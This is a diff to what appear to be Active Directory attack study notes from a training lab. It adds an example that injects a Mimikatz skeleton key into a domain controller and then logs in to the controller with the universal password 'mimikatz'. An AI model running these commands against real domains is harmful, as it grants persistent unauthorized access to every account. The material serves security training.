@@ -217,10 +217,22 @@ Rubeus.exe diamond
 - All the publicly known methods are NOT persistent across reboots.Yet again, mimikatz to the rescue.
 
 
+**_Example Usage -:_**
+
 - Use the below command to inject a skeleton key (password would be mimikatz) on a Domain Controller of choice. DA privileges required
 
 
 ```powershell
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 ```
- 
+
+
+
+- Now, it is possible to access any machine with a valid username and password as "mimikatz"
+
+
+
+```powershell
+Enter-PSSession -Computername dcorp-dc -credential
+dcorp\Administrator
+```
